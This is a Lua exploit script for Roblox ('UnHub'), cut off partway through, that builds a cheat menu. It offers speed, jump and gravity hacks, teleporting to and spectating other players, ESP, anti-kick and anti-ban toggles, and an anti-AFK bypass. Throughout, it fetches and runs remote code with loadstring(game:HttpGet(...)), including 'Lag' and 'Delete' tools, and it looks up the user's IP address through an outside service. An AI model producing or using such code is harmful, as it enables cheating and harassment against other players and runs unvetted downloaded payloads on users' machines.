local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/LEGO89896/Scripts/refs/heads/main/Rayfield%20Library'))()
local player = game.Players.LocalPlayer
local OldWalkSpeed = player.Character.Humanoid.WalkSpeed
local OldJumpPower = player.Character.Humanoid.JumpPower
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local placeId = game.PlaceId
local currentServerId = game.JobId
local cam = workspace.Camera
local UserService = game:GetService("UserService")
local TextChatService = game:GetService("TextChatService")
local OldGravity = workspace.Gravity
local RunService = game:GetService("RunService")
local hrp = player.Character.HumanoidRootPart
local mouse = player:GetMouse()
local ST = Instance.new("ScreenGui")
local AiChat
local Lighting = game:GetService("Lighting")
local TestService = game:GetService("TestService")
local requestFunc = (syn and syn.request) or (http and http.request)
local RunScript
local startTime = time()
local AutoRejoin = false
local Players = game:GetService("Players")
local frameCount, timeElapsed, lastUpdate = 0, 0, 0
local WalkSpeedSlider, JumpPowerSlider, Gravity1Slider, Gravity2Slider
local TurnOff = true
local Playlist = {}
local FOVRadius = 100
local TeamCheck = false
local WallCheck = false
local AllBool = false
local FlingTarget = ""
local EspToggles = {}
local EspRawScript = {}
local EHB, EHL, EHH, EHT = Color3.new(1, 0, 0), Color3.new(0, 0, 1), Color3.new(0, 1, 0), Color3.new(1, 1, 1)
local follower, following, friend, api
local data
local Track
local ToggleR15 = {}
local MaxAnimation = 10
local CAnimation = 0
local SpeedAnimation = 1
local ToDisable = {Textures = true, VisualEffects = true, Parts = true, Particles = true, Sky = true}
local ToEnable = {FullBright = false}
local Stuff = {}
local RunAntiAfk = nil
local RunAntiFling = nil
local RunAnimationSpeed = nil
local RunAntiKick = false
local RunAntiBan = false
local speed = 1
local CanWalkToPlayer = false
local WalkToPlayerTarget = nil
local TpToPlayerTarget = nil
local ac1 = nil
local EnableFpsCap = false
local X = nil
local FPSLimit = 60
local clock = 8

local function EnabledFps()
	table.clear(Stuff)
	for _, v in next, game:GetDescendants() do
		if ToDisable.Parts and (v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("BasePart")) then
			v.Material = Enum.Material.SmoothPlastic
			table.insert(Stuff, v)
		end
		if ToDisable.Particles and (v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Explosion") or v:IsA("Sparkles") or v:IsA("Fire")) then
			v.Enabled = false
			table.insert(Stuff, v)
		end
		if ToDisable.VisualEffects and (v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("SunRaysEffect")) then
			v.Enabled = false
			table.insert(Stuff, v)
		end
		if ToDisable.Textures and (v:IsA("Decal") or v:IsA("Texture")) then
			v.Texture = ""
			table.insert(Stuff, v)
		end
		if ToDisable.Sky and v:IsA("Sky") then
			v.Parent = nil
			table.insert(Stuff, v)
		end
	end

	if ToEnable.FullBright then
		Lighting.FogColor = Color3.new(1, 1, 1)
		Lighting.FogEnd = math.huge
		Lighting.FogStart = math.huge
		Lighting.Ambient = Color3.new(1, 1, 1)
		Lighting.Brightness = 5
		Lighting.ColorShift_Bottom = Color3.new(1, 1, 1)
		Lighting.ColorShift_Top = Color3.new(1, 1, 1)
		Lighting.OutdoorAmbient = Color3.new(1, 1, 1)
		Lighting.Outlines = true
	end
	TestService:Message("Effects Disabler: Disabled "..#Stuff.." items")
end

function filler(text)
    local text = string.gsub(text, ".GetChildren", ":GetChildren")
    return string.gsub(text, "%.(%d+)", '["%1"]')
end

local function getFullPath(obj)
    local parts = {}
    while obj and obj ~= game and obj ~= workspace do
        local parent = obj.Parent
        if parent then
            local siblings = parent:GetChildren()

            local sameNameCount = 0
            for _, v in ipairs(siblings) do
                if v.Name == obj.Name then
                    sameNameCount = sameNameCount + 1
                end
            end

            if sameNameCount > 1 then
                local index = table.find(siblings, obj) or 0
                table.insert(parts, 1, string.format("%s[%d]", "GetChildren()", index))
            else
                table.insert(parts, 1, obj.Name)
            end
        end
        obj = parent
    end

    if obj == workspace then
        return filler("workspace." .. table.concat(parts, "."))
    else
        return filler(table.concat(parts, "."))
    end
end

RunService.Heartbeat:Connect(function()
    if EnableFpsCap then
    	if os.clock() - clock < 1 / FPSLimit then
    		repeat
    
    		until os.clock() - clock >= 1 /FPSLimit
    	end
    	clock = os.clock()
	end
end)

task.spawn(function()
local Window = Rayfield:CreateWindow({
   Name = "UnHub | by LE_GO89",
   FileName = "UnHub",
   Icon = 0,
   LoadingTitle = "UnHub",
   LoadingSubtitle = "by LE_GO89",
   Theme = "Default",
   ToggleUIKeybind = "H",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil,
      FileName = ""
   },
   Discord = {
      Enabled = false,
      Invite = "",
      RememberJoins = true
   },
   KeySystem = false,
   KeySettings = {
      Title = "UnHub",
      Subtitle = "Key",
      Note = "Get the key by visit the website and wait 5 sec copy the key",
      FileName = "Key",
      SaveKey = false,
      GrabKeyFromSite = false,
      Key = {game:HttpGet("https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Key")}
   }
})

local Main = Window:CreateTab("Main", 125058207637011)
local fps = Main:CreateSection("FPS: 0")
local Ping = Main:CreateSection("Ping: 0")
local Username = Main:CreateSection("Username: " .. player.Name)
local Mouse2D = Main:CreateSection("Mouse 2D: X: 0 Y: 0")
local Mouse3D = Main:CreateSection("Mouse 3D: X: 0 Y: 0 Z: 0")
local PartPath = Main:CreateSection("Part Path: nil")
local Friend = Main:CreateSection("Friend: nil")
local Follower = Main:CreateSection("Follower: nil")
local Following = Main:CreateSection("Following: nil")
local Name = Main:CreateSection("Display Name: " .. player.DisplayName)
local UserId = Main:CreateSection("UserId: " .. player.UserId)
local Age = Main:CreateSection("Account Age: " .. player.AccountAge)
local PlayerInGame = Main:CreateSection("Players : 0")
pcall(function()
	Main:CreateSection("Game: " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name)
end)
Main:CreateSection("GameID: " .. game.PlaceId)
Main:CreateSection("ServerID: " .. game.JobId)
local IP = Main:CreateSection("IP: nil")
local Country = Main:CreateSection("Country: nil")
local position = Main:CreateSection("X: 0 Y: Z: 0")
local health = Main:CreateSection("Health: 0")
local GameTime = Main:CreateSection("Time: 0")
local Speed = Main:CreateSection("Speed: 0/s")
local RR = Main:CreateSection("Type: nil")

pcall(function()
	local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
	if hum and hum.RigType == Enum.HumanoidRigType.R15 then
		RR:Set("Type: R15")
	else
		RR:Set("Type: R6")
	end
end)

task.spawn(function()
    pcall(function()
        api = game.HttpService:JSONDecode(game:HttpGet('https://ipwho.is/'))
        if api then
            IP:Set("IP: " ..api.ip)
            Country:Set("Country: " ..api.country .." " ..api.country_code)
        else
            IP:Set("IP: nil")
            Country:Set("Country: nil")
        end
    end)
    pcall(function()
        follower = game.HttpService:JSONDecode(game:HttpGet('https://friends.roproxy.com/v1/users/' ..player.UserId ..'/followers/count'))
        if follower then
            Follower:Set("Follower: " ..follower.count)
        else
            Follower:Set("Follower: nil")
        end
    end)
    pcall(function()
        following = game.HttpService:JSONDecode(game:HttpGet('https://friends.roproxy.com/v1/users/' ..player.UserId ..'/followings/count'))
        if following then
            Following:Set("Following: " ..following.count)
        else
            Following:Set("Following: nil")
        end
    end)
    pcall(function()
        friend = game.HttpService:JSONDecode(game:HttpGet('https://friends.roblox.com/v1/users/' ..player.UserId ..'/friends/count'))
        if friend then
            Friend:Set("Friend: " ..friend.count)
        else
            Friend:Set("Friend: nil")
        end
    end)
    pcall(function()
        data = HttpService:JSONDecode(game:HttpGet("https://raw.githubusercontent.com/7yd7/sniper-Emote/refs/heads/test/EmoteSniper.json")).data
    end)
end)

local Client = Window:CreateTab("Client", 2242016188)
Client:CreateSection("Walk")

Client:CreateButton({Name = "Reset", Callback = function()
    player.Character.Humanoid.WalkSpeed = OldWalkSpeed
    WalkSpeedSlider:Set(OldWalkSpeed)
end})

Client:CreateInput({Name = "Walk Speed", CurrentValue = "", PlaceholderText = "Value", RemoveTextAfterFocusLost = true, Callback = function(Value)
    local number = tonumber(Value)
    if number then
        player.Character.Humanoid.WalkSpeed = number
        WalkSpeedSlider:Set(number)
    end
end})

WalkSpeedSlider = Client:CreateSlider({Name = "Walk Speed", Range = {0, 1000}, Increment = 1, Suffix = "Speed", CurrentValue = OldWalkSpeed, Flag = "Slider1", Callback = function(Value)
    local number = tonumber(Value)
    if number then
        player.Character.Humanoid.WalkSpeed = number
    end
end})

Client:CreateSection("Jump")

Client:CreateButton({Name = "Reset", Callback = function()
    player.Character.Humanoid.JumpPower = OldJumpPower
    JumpPowerSlider:Set(OldJumpPower)
end})

Client:CreateInput({Name = "Jump Power", CurrentValue = "", PlaceholderText = "Value", RemoveTextAfterFocusLost = true, Callback = function(Value)
    local number = tonumber(Value)
    if number then
        player.Character.Humanoid.JumpPower = number
        JumpPowerSlider:Set(number)
    end
end})

JumpPowerSlider = Client:CreateSlider({Name = "Jump Power", Range = {0, 1000}, Increment = 1, Suffix = "Power", CurrentValue = OldJumpPower, Flag = "Slider1", Callback = function(Value)
    local number = tonumber(Value)
    if number then
        player.Character.Humanoid.JumpPower = number
    end
end})

Client:CreateSection("Gravity")

Client:CreateButton({Name = "Reset", Callback = function()
    workspace.Gravity = OldGravity
    Gravity1Slider:Set(OldGravity)
end})

Client:CreateInput({Name = "Gravity", CurrentValue = "", PlaceholderText = "Value", RemoveTextAfterFocusLost = true, Callback = function(Value)
    local number = tonumber(Value)
    if number then
        workspace.Gravity = number
        Gravity1Slider:Set(number)
    end
end})

Gravity1Slider = Client:CreateSlider({Name = "Gravity", Range = {-1000, 1000}, Increment = 1, Suffix = "Power", CurrentValue = OldGravity, Flag = "Slider1", Callback = function(Value)
    local number = tonumber(Value)
    if number then
        workspace.Gravity = math.floor(number)
    end
end})

Client:CreateSection("Game Setting")

Client:CreateToggle({Name = "Anti Afk Bypass", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    local vu = game:GetService("VirtualUser")
    if Value then
    	RunAntiAfk = game:GetService("Players").LocalPlayer.Idled:connect(function()
    		vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    		wait(1)
    		vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    	end)
    else
        if RunAntiAfk then
            RunAntiAfk:Disconnect()
            RunAntiAfk = nil
        end
    end
end})

Client:CreateToggle({Name = "Anti Fling", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    if Value then
        RunAntiFling = RunService.Stepped:Connect(function()
            for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
    			if plr ~= player then
    				local char = plr.Character
    				if char and char.Parent then
    					for _, v in pairs(char:GetDescendants()) do
    						if v:IsA("BasePart") then
    							v.CanCollide = false
    							v.Velocity = Vector3.new(0, 0, 0)
    							v.RotVelocity = Vector3.new(0, 0, 0)
    						end
    					end
    				end
    			end
    		end
        end)
    else
        if RunAntiFling then
            RunAntiFling:Disconnect()
            RunAntiFling = nil
            for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
    			if plr ~= player then
    				local char = plr.Character
    				if char and char.Parent then
    					for _, v in pairs(char:GetDescendants()) do
    						if v:IsA("BasePart") then
    							v.CanCollide = true
    							v.Velocity = Vector3.new(0, 0, 0)
    							v.RotVelocity = Vector3.new(0, 0, 0)
    						end
    					end
    				end
    			end
    		end
        end
    end
end})

Client:CreateToggle({Name = "Anti Kick", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    RunAntiKick = Value
end})

Client:CreateToggle({Name = "Anti Ban", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    RunAntiBan = Value
end})

Client:CreateButton({Name = "FPS Booster", Callback = function()
    EnabledFps()
end})

Client:CreateToggle({Name = "Black Screen", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    local Gui = game.CoreGui:FindFirstChild("ScreenFrame")
        
    if not Gui and Value then
        Gui = Instance.new("ScreenGui")
        Gui.Name = "ScreenFrame"
        Gui.ResetOnSpawn = false
        Gui.Parent = game.CoreGui
    end
    
    if Value then
        if not Gui:FindFirstChild("Black") then
            local Frame = Instance.new("Frame")
            Frame.Size = UDim2.new(1, 1000, 1, 1000)
            Frame.AnchorPoint = Vector2.new(0.5, 0.5)
            Frame.Name = "Black"
            Frame.BackgroundColor3 = Color3.new(0, 0, 0)
            Frame.BackgroundTransparency = 0
            Frame.ZIndex = 10
            Frame.Parent = Gui
        end
    else
        if Gui and Gui:FindFirstChild("Black") then
            Gui.Black:Destroy()
        end
    end
end})

Client:CreateToggle({Name = "White Screen", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    local Gui = game.CoreGui:FindFirstChild("ScreenFrame")
        
    if not Gui and Value then
        Gui = Instance.new("ScreenGui")
        Gui.Name = "ScreenFrame"
        Gui.ResetOnSpawn = false
        Gui.Parent = game.CoreGui
    end
    
    if Value then
        if not Gui:FindFirstChild("White") then
            local Frame = Instance.new("Frame")
            Frame.Size = UDim2.new(1, 1000, 1, 1000)
            Frame.AnchorPoint = Vector2.new(0.5, 0.5)
            Frame.Name = "White"
            Frame.BackgroundColor3 = Color3.new(1, 1, 1)
            Frame.BackgroundTransparency = 0
            Frame.ZIndex = 10
            Frame.Parent = Gui
        end
    else
        if Gui and Gui:FindFirstChild("White") then
            Gui.White:Destroy()
        end
    end
end})

Client:CreateSlider({Name = "FPS Cap", Range = {1, 240}, Increment = 1, Suffix = "Fps", CurrentValue = 60, Flag = "Slider1", Callback = function(Value)
    FPSLimit = Value
end})

Client:CreateToggle({Name = "Enable FPS Cap", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    EnableFpsCap = Value
end})

Client:CreateButton({Name = "Console", Callback = function()
    game.StarterGui:SetCore("DevConsoleVisible", true)
end})

Client:CreateToggle({Name = "Day & Night", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    local lighting = game.Lighting
    if Value then
        lighting.TimeOfDay = 0
    else
        lighting.TimeOfDay = 12
    end
end})

Client:CreateSection("Position Player")

local TargetTp = Client:CreateLabel("Player: nil", 0, Color3.fromRGB(255, 255, 255), true)
Client:CreateInput({Name = "Teleport", CurrentValue = "", PlaceholderText = "Player Name", RemoveTextAfterFocusLost = true, Callback = function(Text)
    local txt = tostring(Text):lower()
    local localPlayer = game.Players.LocalPlayer
    local localChar = localPlayer.Character
    local localHRP = localChar and localChar:FindFirstChild("HumanoidRootPart")

    if not localHRP then return end

    for _, player in pairs(game.Players:GetPlayers()) do
        if player ~= localPlayer then
            if string.find(player.Name:lower(), txt) then
                TargetTp:Set("Player: " ..player.Name, 0, Color3.fromRGB(255, 255, 255), true)
                local targetHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                TpToPlayerTarget = player
                if targetHRP then
                    localHRP.CFrame = targetHRP.CFrame
                    break
                end
            end
        end
    end
end})

local TargetFollow = Client:CreateLabel("Player: nil", 0, Color3.fromRGB(255, 255, 255), true)
Client:CreateInput({Name = "Follow", CurrentValue = "", PlaceholderText = "Player Name", RemoveTextAfterFocusLost = true, Callback = function(Text)
    local txt = tostring(Text):lower()
    for _, player in pairs(game.Players:GetPlayers()) do
        if player ~= localPlayer then
            if string.find(player.Name:lower(), txt) then
                TargetFollow:Set("Player: " ..player.Name, 0, Color3.fromRGB(255, 255, 255), true)
                local targetHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                if targetHRP then
                    WalkToPlayerTarget = player
                end
            end
        end
    end
end})

local TargetSp = Client:CreateLabel("Player: nil", 0, Color3.fromRGB(255, 255, 255), true)
Client:CreateInput({Name = "Spectator", CurrentValue = "", PlaceholderText = "Player Name", RemoveTextAfterFocusLost = true, Callback = function(txt)
    for _, player in pairs(game.Players:GetPlayers()) do
        if player ~= game.Players.LocalPlayer then
            local found = string.find(player.Name:lower(), txt)
            if found then
                TargetSp:Set("Player: " ..player.Name, 0, Color3.fromRGB(255, 255, 255), true)
                local cam = workspace.CurrentCamera
                if player.Character and player.Character:FindFirstChild("Humanoid") then
                    cam.CameraSubject = player.Character.Humanoid
                    break
                end
            end
        end
    end
end})

local TargetPosition = Client:CreateLabel("X: nil Y: nil Z: nil", 0, Color3.fromRGB(255, 255, 255), true)
Client:CreateInput({Name = "Teleport To Position", CurrentValue = "", PlaceholderText = "Position", RemoveTextAfterFocusLost = true, Callback = function(txt)
    local delimiter = string.find(txt, ",") and "," or " "
    local coords = string.split(txt, delimiter)
    if #coords ~= 3 then
        return
    end
    local x = tonumber(coords[1])
    local y = tonumber(coords[2])
    local z = tonumber(coords[3])
    TargetPosition:Set("X: " ..x .." Y: " ..y .." Z: " ..z, 0, Color3.fromRGB(255, 255, 255), true)
    if not x or not y or not z then
        return
    end
    y = y + 1
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(x, y, z)
end})

for _, player in ipairs(Players:GetPlayers()) do
    table.insert(Playlist, player.Name)
end

local TP = Client:CreateDropdown({
    Name = "Teleport",
    Options = Playlist,
    CurrentOption = {},
    MultipleOptions = false,
    Flag = "Dropdown1",
    Callback = function(name)
        local localPlayer = Players.LocalPlayer
        local localChar = localPlayer.Character
        local localHRP = localChar and localChar:FindFirstChild("HumanoidRootPart")
        if not localHRP then return end

        for _, player in pairs(Players:GetPlayers()) do
            if player.Name:lower():find(name:lower()) then
                TargetTp:Set("Player: " ..player.Name, 0, Color3.fromRGB(255, 255, 255), true)
                TpToPlayerTarget = player
                local targetHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                if targetHRP then
                    localHRP.CFrame = targetHRP.CFrame
                    break
                end
            end
        end
    end
})

local WT = Client:CreateDropdown({
    Name = "Follow",
    Options = Playlist,
    CurrentOption = {},
    MultipleOptions = false,
    Flag = "Dropdown1",
    Callback = function(name)
        for _, player in pairs(Players:GetPlayers()) do
            if player.Name:lower():find(name:lower()) then
                TargetFollow:Set("Player: " ..player.Name, 0, Color3.fromRGB(255, 255, 255), true)
                local targetHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                if targetHRP then
                    WalkToPlayerTarget = player
                    break
                end
            end
        end
    end
})

local SP = Client:CreateDropdown({
    Name = "Spectator",
    Options = Playlist,
    CurrentOption = {},
    MultipleOptions = false,
    Flag = "Dropdown1",
    Callback = function(name)
        for _, player in pairs(Players:GetPlayers()) do
            if player.Name:lower():find(name:lower()) then
                local cam = workspace.CurrentCamera
                TargetSp:Set("Player: " ..player.Name, 0, Color3.fromRGB(255, 255, 255), true)
                if player.Character and player.Character:FindFirstChild("Humanoid") then
                    cam.CameraSubject = player.Character.Humanoid
                    break
                end
            end
        end
    end
})

local CPN = Client:CreateDropdown({
    Name = "Copy Player Name",
    Options = Playlist,
    CurrentOption = {},
    MultipleOptions = false,
    Flag = "Dropdown1",
    Callback = function(name)
        setclipboard(name)
    end
})

Client:CreateButton({
    Name = "Refresh",
    Callback = function()
        Playlist = {}
        for _, player in ipairs(Players:GetPlayers()) do
            table.insert(Playlist, player.Name)
        end
        CPN:Refresh(Playlist)
        TP:Refresh(Playlist)
        SP:Refresh(Playlist)
        WT:Refresh(Playlist)
    end
})

Client:CreateToggle({Name = "Enable Following", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    CanWalkToPlayer = Value
end})

Client:CreateButton({Name = "Teleport", Callback = function()
    player.Character.HumanoidRootPart.CFrame = TpToPlayerTarget.Character.HumanoidRootPart.CFrame
end})

Client:CreateButton({Name = "Reset Spectator", Callback = function()
    game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
end})

Client:CreateSection("Game & Server")

Client:CreateInput({Name = "Game", CurrentValue = "", PlaceholderText = "GameId", RemoveTextAfterFocusLost = true, Callback = function(Value)
    TeleportService:Teleport(Value)
end})

Client:CreateInput({Name = "Server", CurrentValue = "", PlaceholderText = "ServerId", RemoveTextAfterFocusLost = true, Callback = function(Value)
    TeleportService:TeleportToPlaceInstance(game.PlaceId, Value, player)
end})

Client:CreateButton({Name = "Rejoin", Callback = function()
    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
end})

Client:CreateButton({Name = "Server Hop", Callback = function()
    local servers = {}
    local req = game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true")
    local body = HttpService:JSONDecode(req)

    if body and body.data then
        for i, v in next, body.data do
            if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= JobId then
                table.insert(servers, 1, v.id)
            end
        end
    end

    if #servers > 0 then
        TeleportService:TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], Players.LocalPlayer)
    end
end})

Client:CreateToggle({Name = "Auto Rejoin", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    AutoRejoin = Value
end})

Client:CreateSection("Character")

Client:CreateButton({Name = "Reset", Callback = function()
    game.Players.LocalPlayer.Character.Humanoid.Health = 0
end})

local InfiniteJumpEnabled = false
local InfiniteJumpConnection

Client:CreateToggle({Name = "Infinite Jump", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    InfiniteJumpEnabled = Value
    if Value and not InfiniteJumpConnection then
        InfiniteJumpConnection = game:GetService("UserInputService").JumpRequest:Connect(function()
            if InfiniteJumpEnabled then
                local humanoid = game:GetService("Players").LocalPlayer.Character and game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end
            end
        end)
    elseif not Value and InfiniteJumpConnection then
        InfiniteJumpConnection:Disconnect()
        InfiniteJumpConnection = nil
    end
end})

Client:CreateInput({Name = "Chat", CurrentValue = "", PlaceholderText = "Text", RemoveTextAfterFocusLost = true, Callback = function(txt)
    if game:GetService('TextChatService').ChatVersion == Enum.ChatVersion.LegacyChatService then
        game:GetService('ReplicatedStorage'):WaitForChild('DefaultChatSystemChatEvents'):WaitForChild('SayMessageRequest'):FireServer(txt, 'All')
    else
        game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(txt)
    end
end})

Client:CreateToggle({Name = "Sit", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    game.Players.LocalPlayer.Character.Humanoid.Sit = Value
end})

Client:CreateToggle({Name = "Equip All Toots", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    if Value then
        for _, tools in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
            if tools:IsA("Tool") then
                tools.Parent = game.Players.LocalPlayer.Character
            end
        end
    else
        for _, tools in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if tools:IsA("Tool") then
                tools.Parent = game.Players.LocalPlayer.Backpack
            end
        end
    end
end})

Client:CreateSlider({Name = "Pov View", Range = {0, 120}, Increment = 1, Suffix = "Pov", CurrentValue = cam.FieldOfView, Flag = "Slider1", Callback = function(Value)
    local number = tonumber(Value)
    if number then
        cam.FieldOfView = number
    end
end})

local Blur = game:GetService("Lighting"):FindFirstChild("Blur")
if not Blur then
    Blur = Instance.new("BlurEffect")
    Blur.Parent = game:GetService("Lighting")
    Blur.Size = 0
end

Client:CreateSlider({Name = "Blur", Range = {0, 100}, Increment = 1, Suffix = "Size", CurrentValue = Blur.Size, Flag = "Slider1", Callback = function(Value)
    local Blur = game:GetService("Lighting"):FindFirstChild("Blur")
    if not Blur then
        Blur = Instance.new("BlurEffect")
        Blur.Parent = game:GetService("Lighting")
        Blur.Size = 0
    end
    Blur.Size = Value
end})

Client:CreateSection("Animations & Sounds")

local s = Instance.new("Sound", game.Workspace)
local a = Instance.new("Animation")
local AT

Client:CreateInput({Name = "Change Animation Speed", CurrentValue = "", PlaceholderText = "Value", RemoveTextAfterFocusLost = true, Callback = function(Value)
    speed = tonumber(Value)
end})

Client:CreateToggle({Name = "Animation Speed", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    if Value then
        local plr = game.Players.LocalPlayer
        local chr = plr.Character
        local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
        RunAnimationSpeed = game:GetService("RunService").Heartbeat:Connect(function()
            for _, track in pairs(hum:GetPlayingAnimationTracks()) do
                track:AdjustSpeed(speed)
            end
        end)
    else
        if RunAnimationSpeed then
            RunAnimationSpeed:Disconnect()
            RunAnimationSpeed = nil
        end
    end
end})

Client:CreateToggle({Name = "Freeze Animation", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    local animate = game.Players.LocalPlayer.Character.Animate
    local hum = game.Players.LocalPlayer.Character.Humanoid
    if Value then
        animate.Enabled = false
        for _, track in pairs(hum:GetPlayingAnimationTracks()) do
            track:AdjustSpeed(0)
        end
    else
        animate.Enabled = true
        for _, track in pairs(hum:GetPlayingAnimationTracks()) do
            track:AdjustSpeed(1)
        end
    end
end})

Client:CreateInput({Name = "Load Animation", CurrentValue = "", PlaceholderText = "Animation Id", RemoveTextAfterFocusLost = true, Callback = function(txt)
    if string.find(txt, "http://www.roblox.com") then
        a.AnimationId = string.gsub(txt, "http://www.roblox.com/asset/?id=", "rbxassetid://")
    elseif string.find(txt, "rbxassetid://") then
    	a.AnimationId = txt
    else
        a.AnimationId = "rbxassetid://" ..txt
    end
end})

Client:CreateToggle({Name = "Play", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    local hum = player.Character.Humanoid
    if Value then
        AT = hum:LoadAnimation(a)
        AT:Play()
    else
        if AT then
            AT:Stop()
        end
    end
end})

Client:CreateInput({Name = "Load Sound", CurrentValue = "", PlaceholderText = "Sound Id", RemoveTextAfterFocusLost = true, Callback = function(txt)
    if string.find(txt, "http://www.roblox.com") then
        s.SoundId = string.gsub(txt, "http://www.roblox.com/asset/?id=", "rbxassetid://")
    elseif string.find(txt, "rbxassetid://") then
    	s.SoundId = txt
    else
        s.SoundId = "rbxassetid://" ..txt
    end
end})

Client:CreateToggle({Name = "Play", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
    if Value then
        s:Play()
    else
        if s.Playing then
            s:Stop()
        end
    end
end})

local Tool = Window:CreateTab("Tool", 6767454852)
Tool:CreateSection("Tools")

local T = {
    {N = "TP Tool", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Tool/TP%20Tool"},
    {N = "Block Tool", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Tool/Block%20Tool"},
    {N = "Print Pos Tool", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Tool/Print%20Pos%20Tool"},
    {N = "Super Tool", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Tool/Super%20Tool"},
    {N = "Fly Tool", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Tool/Fly%20Tool"},
    {N = "NoClip Tool", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Tool/NoClip%20Tool"},
    {N = "Swim Tool", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Tool/Swim%20Tool"},
    {N = "Freeze Tool", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Tool/Freeze%20Tool"},
    {N = "FreeCam Tool", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Tool/FreeCam%20Tool"},
    {N = "Spin Tool", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Tool/Spin%20Tool"},
    {N = "Jerk Tool", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Tool/Jerk%20Tool"},
    {N = "Lag Tool", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Tool/Lag%20Tool"},
    {N = "Punch Tool [R6]", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Tool/Punch%20Tool%20%5BR6%5D"},
    {N = "Telekinesis Tool", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Tool/Telekinesis%20Tool"},
    {N = "AK-47 Tool", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Tool/AK%2D47%20Tool"},
    {N = "Delete Tool", U = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Tool/Delete%20Tool"},
}
for i, t in pairs(T) do
    Tool:CreateButton({Name = t.N, Callback = function()
        loadstring(game:HttpGet(t.U))()
    end})
end

task.spawn(function()
    local Esp = Window:CreateTab("Esp", 6523858394)
    
    local E = {
        {N = "Esp Account Age", F = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Esp/AccountAge"},
        {N = "Esp UserId", F = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Esp/UserId"},
        {N = "Esp Name", F = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Esp/Name"},
        {N = "Esp Health", F = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Esp/Health"},
        {N = "Esp Display Name", F = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Esp/DisplayName"},
        {N = "Esp Position", F = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Esp/Position"},
        {N = "Esp Distance", F = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Esp/Distance"},
        {N = "Esp Highlights", F = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Esp/Highlights"},
        {N = "Esp Line", F = "https://raw.githubusercontent.com/BG-Home-Official/Script/refs/heads/main/Scripts/Esp/Line"},
